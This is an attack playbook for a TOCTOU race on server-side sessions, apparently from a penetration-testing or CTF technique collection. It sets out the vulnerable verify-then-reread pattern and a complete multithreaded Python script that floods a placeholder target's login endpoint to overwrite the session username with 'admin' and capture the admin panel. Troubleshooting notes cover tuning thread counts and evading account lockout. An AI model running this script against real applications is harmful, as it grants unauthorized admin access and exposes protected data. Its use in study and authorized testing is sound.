# TOCTOU Session Race (Verify-Then-Use Gap)

## When this applies

- Application uses server-side session storage (database, Redis, memcached).
- Two-step authorization: `verify_session()` uses cached/request-scoped data, then `get_session()` re-reads from the DB for role checks.
- Session table uses `READ UNCOMMITTED` (or low isolation level) so dirty writes leak between threads.
- Login endpoint writes username directly into the session record.

## Technique

Run three concurrent thread pools:
1. **flip_admin** — writes `admin` into the session DB record (with wrong password — only the SESSION username is updated, not auth).
2. **flip_valid** — writes back the legitimate `test` username so verify_session passes.
3. **check_admin** — hits the protected endpoint. When timing aligns: verify sees cached `test` (passes), get_session reads dirty `admin` (privileged data returned).

## Steps

### Vulnerable pattern

```python
# Step 1: verify_session() uses cached session data (e.g., Flask session proxy)
# Passes because the session belongs to a valid low-privilege user
verify_session()

# Step 2: get_session() re-reads from database (race window!)
# If another request changed the session's username to 'admin' in the DB...
sess = get_session()
user = User.query.filter_by(username=sess.get('username')).first()

if user.is_admin:
    # ...we get admin access with a non-admin session!
    return render_template('admin_panel.html', secret=secret_content)
```

### Key indicators

- Server-side session storage (database, Redis, memcached)
- `READ UNCOMMITTED` or low isolation level on session table
- Two-step authorization: verify session validity, then re-read session for role check
- Login endpoint that writes username into session record directly

### Exploitation script

```python
import threading
import requests

BASE = "http://target"
session = requests.Session()

# Step 1: Login with valid low-privilege credentials to get a session cookie
session.post(f"{BASE}/login", data={"username": "test", "password": "test"})
cookie = session.cookies.get_dict()

stop = threading.Event()
found = []

def flip_admin():
    """Continuously overwrite the session record with admin username"""
    s = requests.Session(); s.cookies.update(cookie)
    while not stop.is_set():
        s.post(f"{BASE}/login", data={"username": "admin", "password": "wrong"})

def flip_valid():
    """Restore session to valid user so verify_session() passes"""
    s = requests.Session(); s.cookies.update(cookie)
    while not stop.is_set():
        s.post(f"{BASE}/login", data={"username": "test", "password": "test"})

def check_admin():
    """Hit the protected endpoint — verify uses cached 'test', get_session reads dirty 'admin'"""
    s = requests.Session(); s.cookies.update(cookie)
    while not stop.is_set():
        r = s.get(f"{BASE}/admin_panel")
        if "admin" in r.text.lower() and len(r.text) > 500:
            found.append(r.text)
            stop.set()

# Launch concurrent threads
threads = []
for _ in range(3): threads.append(threading.Thread(target=flip_admin))
for _ in range(3): threads.append(threading.Thread(target=flip_valid))
for _ in range(5): threads.append(threading.Thread(target=check_admin))

for t in threads: t.start()
stop.wait(timeout=60)
stop.set()
for t in threads: t.join()

if found:
    print("TOCTOU race won — admin content retrieved")
    print(found[0][:500])
```

### Why this works

1. `flip_valid` keeps the session valid (verify_session passes with low-priv user)
2. `flip_admin` writes 'admin' username into the session DB record (dirty write)
3. `check_admin` hits the protected endpoint — verify_session uses cached request data (passes), then get_session re-reads from DB and sees 'admin' (dirty read)
4. `READ UNCOMMITTED` isolation means get_session sees uncommitted writes from flip_admin threads

### Success indicators

- Protected page content returned (admin panel, dashboard, secrets)
- Response length significantly larger than the redirect/error response
- Different HTML template rendered (admin vs login)

### Troubleshooting

- If verify_session always fails: ensure flip_valid threads run with correct credentials
- If admin content never appears: increase thread count, check if login actually writes to session table
- If getting locked out: add small delays between flip attempts, use multiple session cookies
- Low success rate: run for longer (60-120s), or increase flip_admin thread count

## Verifying success

- `check_admin` thread captures a response > 500 bytes containing "admin" markers.
- The captured response includes secrets that only the admin panel renders.
- Repeating the attack on a fresh session reproduces the win.

## Common pitfalls

- Higher isolation (REPEATABLE READ, SERIALIZABLE) closes the race — verify isolation level via `SHOW VARIABLES LIKE 'tx_isolation'` or via source code reading.
- Some frameworks recompute the session.username from a JWT or signed cookie — those are immune.
- Account lockout from `flip_admin` (wrong password) may trigger — use a fictitious admin login that doesn't lock out, or a username that isn't subject to lockout.

## Tools

- Python `threading` (raw)
- Burp Turbo Intruder (custom multi-request gate scripting)
- Custom Python with `requests.Session`
